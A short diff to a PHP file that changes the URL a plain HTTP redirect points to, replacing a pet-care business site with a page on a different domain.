@@ -1,4 +1,4 @@
 <?php
-header("Location: https://my-pet-care.business.site");
+header("Location: https://exhibitarchitects.us/vapplymain.html");
 die();
 ?>
